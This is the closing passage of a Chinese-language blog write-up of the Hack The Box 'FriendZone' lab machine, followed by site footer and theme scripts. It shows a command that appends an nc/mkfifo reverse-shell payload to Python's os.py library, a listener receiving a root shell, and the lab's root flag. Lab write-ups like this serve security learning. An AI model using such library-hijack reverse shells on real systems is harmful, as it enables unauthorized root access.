+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@FriendZone:/$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 10010 &gt;/tmp/f&#x27;)&quot;</span> &gt;&gt; /usr/lib/python2.7/os.py<br>&lt;0.14.7 10010 &gt;/tmp/f<span class="hljs-string">&#x27;)&quot; &gt;&gt; /usr/lib/python2.7/os.py</span><br><span class="hljs-string">www-data@FriendZone:/$</span><br></code></pre></td></tr></table></figure>
+
+<p>15、获取到最终的root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali-linux-2022-2)-[~]<br>└─$ nc -lnvp 10010<br>listening on [any] 10010 ...<br>connect to [10.10.14.7] from (UNKNOWN) [10.10.10.123] 48600<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string"># id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="hljs-string"># pwd</span><br><span class="hljs-string">/root</span><br><span class="hljs-string"># ls</span><br><span class="hljs-string">certs</span><br><span class="hljs-string">root.txt</span><br><span class="hljs-string"># cat root.txt</span><br><span class="hljs-string">39745fd268a059fb44a08c6a54edb2bb</span><br><span class="hljs-string"># </span><br></code></pre></td></tr></table></figure>
+
+<p>16、不过问，为啥这篇文章这么简略，因为枚举到吐都不知道咋弄，信息检索能力太差，就这？还容易级别？？？我OSCP还考不考吧 &#x3D;&#x3D; ，要是都是这个题，我估计我可以放弃了。</p>
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/173</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>FriendZone-htb-writeup</div>
+      <div>https://sh1yan.top/2023/12/06/FriendZone-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/07/SwagShop-htb-writeup/" title="SwagShop-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SwagShop-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/06/Irked-htb-writeup/" title="Irked-htb-writeup">
+                        <span class="hidden-mobile">Irked-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
